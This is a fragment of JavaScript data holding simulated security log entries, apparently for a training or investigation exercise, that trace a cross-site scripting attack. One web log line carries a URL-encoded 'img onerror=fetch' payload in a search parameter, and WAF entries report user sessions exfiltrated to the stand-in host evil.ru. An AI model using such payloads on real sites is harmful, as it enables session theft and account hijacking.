    { time: '03:47:12', source: 'waf', level: 'critical', msg: 'Outbound connection detected — <span class="session">sess_8f2a</span> (sarah.martinez) exfiltrated to <span class="hl">evil.ru</span>', suspicious: true },
    { time: '04:12:45', source: 'web', level: 'warn', msg: '<span class="ip">203.0.113.42</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(...)%3E</span></span> 200 — Firefox/125 — <span class="hl">second victim</span>', suspicious: true },
    { time: '04:12:46', source: 'waf', level: 'critical', msg: 'Outbound connection — <span class="session">sess_c41b</span> (james.wong) exfiltrated to <span class="hl">evil.ru</span>', suspicious: true },
    { time: '04:38:19', source: 'auth', level: 'info', msg: '<span class="ip">44.192.88.12</span> LOGIN success — user: <span class="session">lisa.chen@email.com</span> — session: <span class="session">sess_e7f3</span>' },
